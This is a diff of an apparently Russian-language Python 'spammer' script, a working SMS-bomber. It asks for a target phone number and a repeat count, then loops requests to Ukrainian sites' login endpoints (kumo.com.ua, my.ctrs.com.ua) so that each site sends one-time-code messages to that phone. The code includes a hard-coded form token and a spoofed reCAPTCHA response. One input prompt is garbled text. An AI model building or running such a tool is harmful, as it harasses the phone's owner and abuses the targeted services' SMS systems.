@@ -44,21 +44,13 @@ NUMBER = input('[green]Beeante HOMeP tenedona: (бes + ')
 
 run = int(console.input('[green]Введите количество повторов (1-35):\n[blue]spammer>> '))
 for _ in track(range(run)):
-
  try:
-     print('3')
-     formatted_phone = format_phone(number, "+###+##+###+##+##")
-     requests.post("https://kumo.com.ua/login/sms/", data={"phone": "+" + NUMBER, "_token": "bXjwBMo8eSTiyWpex3QEOqwblgWabMYTPK2uyZ7m", "g-recaptcha-response": "1"}, headers=headers)
+     print('Отправлено')
+     response = requests.post('https://my.ctrs.com.ua/api/auth/login', headers=headers, json={'phone' :  NUMBER})
  except:
-     print('33')
+     print('Не доставлено')
  try:
-     print('4')
-     formatted_phone = format_phone(number, "+###+##+###+##+##")
-     requests.post("https://kumo.com.ua/login/sms/", data={"phone": "+" + NUMBER}, headers=headers)
+     print('Отправлено')
+     response = requests.post('https://my.ctrs.com.ua/api/auth/login', headers=headers, json={'phone': "+" + NUMBER})
  except:
-     print('44')
- try:
-     print('5')
-     requests.post("https://kumo.com.ua/login/sms/", data={"phone": "+" + NUMBER}, headers=headers)
- except:
-     print('55')
+     print('Не доставлено')
